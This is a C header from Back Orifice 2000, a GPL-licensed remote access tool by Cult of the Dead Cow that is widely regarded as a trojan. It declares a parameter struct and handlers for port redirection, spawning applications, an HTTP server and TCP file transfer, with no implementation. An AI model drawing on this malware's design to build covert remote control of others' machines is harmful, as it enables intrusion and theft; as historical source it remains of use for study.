/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

#ifndef __INC_CMD_TCPIP_H
#define __INC_CMD_TCPIP_H

#include<windows.h>
#include<auth.h>

#pragma pack(push,1)
typedef struct __port_child_param {
	SOCKET s;
	SOCKADDR_IN saddr;
	BOOL *pbDone;
	int nArg1;
	char *svArg2;
	char *svArg3;
} PORT_CHILD_PARAM;
#pragma pack(pop)

void Cmd_Tcpip_Init(void);
void Cmd_Tcpip_Kill(void);

int CmdProc_RedirAdd(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3);
int CmdProc_AppAdd(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3);
int CmdProc_HTTPEnable(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3);
int CmdProc_TCPFileReceive(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3);
int CmdProc_PortList(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3);
int CmdProc_PortDel(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3);
int CmdProc_TCPFileSend(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3);

#endif